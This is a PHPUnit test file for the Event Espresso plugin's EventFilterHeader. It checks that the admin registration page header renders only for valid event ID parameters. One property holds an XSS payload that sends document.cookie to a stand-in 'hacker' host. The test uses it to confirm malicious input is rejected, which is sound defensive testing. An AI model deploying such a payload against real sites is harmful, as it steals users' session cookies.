<?php

namespace EventEspresso\tests\testcases\core\domain\services\admin\registrations\list_table\page_header;

use EE_Error;
use EE_Event;
use EEM_Event;
use EventEspresso\core\domain\services\admin\registrations\list_table\page_header\EventFilterHeader;
use EventEspresso\core\exceptions\InvalidDataTypeException;
use EventEspresso\core\exceptions\InvalidInterfaceException;
use EventEspresso\tests\mocks\core\services\request\RequestMock;
use Generator;
use InvalidArgumentException;
use PHPUnit\Framework\Exception;
use PHPUnit\Framework\TestCase;
use ReflectionException;

/**
 * @group AdminPageHeaderDecoratorTests
 */
class EventFilterHeaderTest extends TestCase
{

    /**
     * @var EE_Event $event
     */
    protected $event;

    /**
     * @var string $xss
     */
    private $xss = '"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>';


    public static function setUpBeforeClass()
    {
        require_once EE_ADMIN . 'EE_Admin_Page.core.php';
        if (! defined('EVENTS_ADMIN_URL')) {
            define('EVENTS_ADMIN_URL', admin_url('admin.php?page=espresso_events'));
        }
    }


    /**
     * @throws EE_Error
     * @throws Exception
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws ReflectionException
     * @since $VID:$
     */
    public function setUp()
    {
        $this->setUpEvent();
    }

    /**
     * @throws EE_Error
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws ReflectionException
     * @throws Exception
     * @throws InvalidArgumentException
     * @since $VID:$
     */
    public function setUpEvent()
    {
        $this->event = EE_Event::new_instance([
            'EVT_name' => 'Stephen Hawking’s Time Traveler Party',
        ]);
        $saved = $this->event->save();
        $this->assertTrue($saved > 0);
    }


    /**
     * @param array $get_params
     * @return EventFilterHeader
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws EE_Error
     * @throws InvalidArgumentException
     * @throws InvalidArgumentException
     * @since $VID:$
     */
    private function getEventFilterHeader(array $get_params)
    {
        return new EventFilterHeader(
            new RequestMock($get_params, [], [], [], []),
            EEM_Event::instance()
        );
    }


    /**
     * generator function to replace phpunit's dataProvider
     * because those run during initial phpunit setup
     * and NOT when this actual test class is run,
     * therefore making it impossible to create
     * and save entities to the database in order to use
     * their autoincrement IDs in this function
     * and have those entities still exist when these
     * testcases actually run.
     *
     * @return Generator
     * @since  $VID:$
     */
    public function testDataGenerator()
    {
        $ID = $this->event->ID();
        $site_admin_url = admin_url();
        $test_data = [
            // empty array
            [[], ''],
            // invalid keys
            [['EVT-ID' => $ID], ''],
            [['event-id' => $ID], ''],
            // invalid values
            [['EVT_ID' => '<h1>I am from the Future!!!</h1>'], ''],
            [['EVT_ID' => $this->xss], ''],
            [['event_id' => '<h1>I am from the Future!!!</h1>'], ''],
            [['event_id' => $this->xss], ''],
            // all good
            [
                ['EVT_ID' => $ID],
                '<h3 style="line-height:1.5em;"> Viewing registrations for the event: &nbsp;<a href="'
                . $site_admin_url . 'admin.php?page=espresso_events&action=edit&post=' . $ID
                . '&edit_nonce=">Stephen Hawking’s Time Traveler Party</a>&nbsp;</h3>'
            ],
            [
                ['event_id' => $ID],
                '<h3 style="line-height:1.5em;"> Viewing registrations for the event: &nbsp;<a href="'
                . $site_admin_url . 'admin.php?page=espresso_events&action=edit&post=' . $ID
                . '&edit_nonce=">Stephen Hawking’s Time Traveler Party</a>&nbsp;</h3>'
            ],
        ];
        foreach ($test_data as $data) {
            yield $data;
        }
    }


    /**
     * @throws InvalidArgumentException
     * @throws InvalidDataTypeException
     * @throws InvalidInterfaceException
     * @throws EE_Error
     * @throws ReflectionException
     * @throws Exception
     * @since        $VID:$
     */
    public function testGetHeaderText()
    {
        foreach ($this->testDataGenerator() as list($get_params, $expected)) {
            $this->assertInstanceOf('EE_Event', $this->event);
            $event_filter_header = $this->getEventFilterHeader($get_params);
            $header_text = $event_filter_header->getHeaderText();
            // strip out nonce since it constantly changes
            $header_text = preg_replace('/&edit_nonce=\S+"/', '&edit_nonce="', $header_text);
            $this->assertEquals($expected, $header_text);
        }
    }
}
